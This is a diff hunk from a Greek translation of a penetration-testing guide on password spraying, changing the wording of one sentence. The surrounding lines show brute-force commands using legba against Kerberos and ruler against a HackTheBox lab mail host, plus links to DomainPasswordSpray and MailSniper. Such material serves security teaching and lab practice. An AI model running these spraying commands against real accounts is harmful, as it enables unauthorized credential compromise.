@@ -99,7 +99,7 @@ legba kerberos --target 127.0.0.1 --username admin --password wordlists/password
 - Με [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
 - Με [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-Για να χρησιμοποιήσετε οποιοδήποτε από αυτά τα εργαλεία, χρειάζεστε μια λίστα χρηστών και έναν κωδικό πρόσβασης / μια μικρή λίστα κωδικών πρόσβασης για ψεκασμό.
+Για να χρησιμοποιήσετε οποιοδήποτε από αυτά τα εργαλεία, χρειάζεστε μια λίστα χρηστών και έναν κωδικό / μια μικρή λίστα κωδικών για να κάνετε spray.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
